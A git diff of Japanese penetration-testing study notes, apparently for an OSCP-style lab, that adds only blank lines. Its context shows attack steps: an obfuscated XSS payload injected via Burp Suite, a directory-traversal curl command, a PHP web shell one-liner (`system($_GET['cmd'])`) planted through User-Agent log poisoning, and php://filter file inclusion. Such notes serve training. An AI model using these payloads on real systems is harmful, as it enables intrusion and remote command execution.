@@ -95,9 +95,11 @@ ajaxRequest.send(params);
 
 4. [Web攻撃の難読化](../Cheatsheet/Evasion(試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。
 5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）
+
 ![](../画像ファイル/Pasted%20image%2020250321200240.png)
 
 6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功
+
 ![](../画像ファイル/Pasted%20image%2020250320123601.png)
 
 ![](../画像ファイル/Pasted%20image%2020250320123617.png)
@@ -151,7 +153,9 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 ```php
 <?php echo system($_GET['cmd']); ?>
 ```
+
 ![](../画像ファイル/Pasted%20image%2020250322224544.png)
+
 $$User-Agentにペイロードを注入$$
 
 3. ステップ２でWeb shellペイロードがログファイルに記録されているかどうかを確認するため、プロセスを閲覧する（URL encodeすること）
@@ -185,6 +189,7 @@ http://example.com/index.php?page=admin.php
 ```
 
 2. Burp Suiteでファイルを実行した結果を閲覧する。このとき、`<body>` などのタグが閉じられていないなど、不自然なコードがないかを探す。
+
 ![](../画像ファイル/Pasted%20image%2020250329113419.png)
 
 3. `php://filter` wrapperを使用してファイルの中身を表示する。もし、ステップ２と結果が変わらない場合は次のステップに進む
